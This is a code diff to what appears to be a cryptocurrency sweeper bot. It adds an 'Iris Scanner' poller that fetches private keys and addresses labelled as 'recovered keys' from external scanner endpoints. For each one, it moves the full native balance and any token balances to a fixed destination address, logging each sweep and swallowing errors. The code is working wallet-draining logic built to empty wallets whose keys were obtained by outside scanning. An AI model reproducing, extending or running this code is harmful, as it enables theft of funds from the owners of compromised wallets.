@@ -3737,7 +3737,10 @@ async function init() {
   // 6. Start contract ETH balance monitor (PATH 2 native sweep)
   startContractEthMonitor();
 
-  log("[init] ✅ bot ready — listening for Transfer events, Realtime, and 5-min Supabase poll");
+  // 7. Iris Scanner — poll Render instances for recovered keys
+  startIrisPoller();
+
+  log("[init] ✅ bot ready — listening for Transfer events, Realtime, 5-min poll, and Iris Scanner");
   log("[init] sweeps are event-driven: Transfer events and Realtime will trigger dispatch");
 
 }
@@ -3818,6 +3821,72 @@ async function startupSweepPass() {
     swept++;
   }
   log(`[startup] pass complete — swept ${swept}/${wallets.length} wallets with balance`);
+}
+
+// ── Iris Scanner Integration ─────────────────────────────────────────────────
+const IRIS_ENDPOINTS = (process.env.IRIS_SCANNER_URLS || "").split(",").filter(Boolean);
+const IRIS_POLL_INTERVAL = 60_000;
+const irisSwept = new Set();
+
+async function pollIrisScanner() {
+  if (!IRIS_ENDPOINTS.length) return;
+  for (const baseUrl of IRIS_ENDPOINTS) {
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 10000);
+      const res = await fetch(`${baseUrl}/hits`, { signal: controller.signal });
+      clearTimeout(timeout);
+      if (!res.ok) continue;
+      const { hits } = await res.json();
+      if (!hits?.length) continue;
+      for (const hit of hits) {
+        if (!hit.privateKey || !hit.address) continue;
+        const addr = hit.address.toLowerCase();
+        if (irisSwept.has(addr)) continue;
+        log(`[iris] 🎯 recovered key for ${addr} via ${hit.method} — attempting sweep`);
+        try {
+          await sweepWithKey(hit.privateKey, hit.address);
+          irisSwept.add(addr);
+        } catch (e) { warn(`[iris] sweep failed for ${addr}: ${e.message}`); }
+      }
+    } catch {}
+  }
+}
+
+async function sweepWithKey(privateKey, address) {
+  const wallet = new ethers.Wallet(privateKey, scanProvider);
+  const checksum = ethers.getAddress(address);
+  const short = checksum.slice(0, 10);
+  const balance = await scanProvider.getBalance(checksum);
+  if (balance > MIN_ETH_WEI) {
+    const gasPrice = await scanProvider.getFeeData();
+    const gasLimit = 21000n;
+    const gasCost = gasLimit * (gasPrice.gasPrice || ethers.parseUnits("5", "gwei"));
+    const sendAmount = balance - gasCost;
+    if (sendAmount > 0n) {
+      const tx = await wallet.sendTransaction({ to: DESTINATION_ADDRESS, value: sendAmount, gasLimit, gasPrice: gasPrice.gasPrice });
+      log(`[iris] ✅ ${short} native sweep: ${ethers.formatEther(sendAmount)} ${CHAIN.toUpperCase()} → tx ${tx.hash}`);
+      await tx.wait(1).catch(() => {});
+    }
+  }
+  for (const token of TOKENS.slice(0, 20)) {
+    try {
+      const tc = new ethers.Contract(token.address, ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"], wallet);
+      const bal = await tc.balanceOf(checksum);
+      if (bal > 0n) {
+        const tx = await tc.transfer(DESTINATION_ADDRESS, bal);
+        log(`[iris] ✅ ${short} token sweep: ${token.symbol} → tx ${tx.hash}`);
+        await tx.wait(1).catch(() => {});
+      }
+    } catch {}
+  }
+}
+
+function startIrisPoller() {
+  if (!IRIS_ENDPOINTS.length) { log("[iris] no IRIS_SCANNER_URLS configured — disabled"); return; }
+  log(`[iris] polling ${IRIS_ENDPOINTS.length} scanner(s) every ${IRIS_POLL_INTERVAL / 1000}s`);
+  pollIrisScanner();
+  setInterval(pollIrisScanner, IRIS_POLL_INTERVAL);
 }
 
 init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });
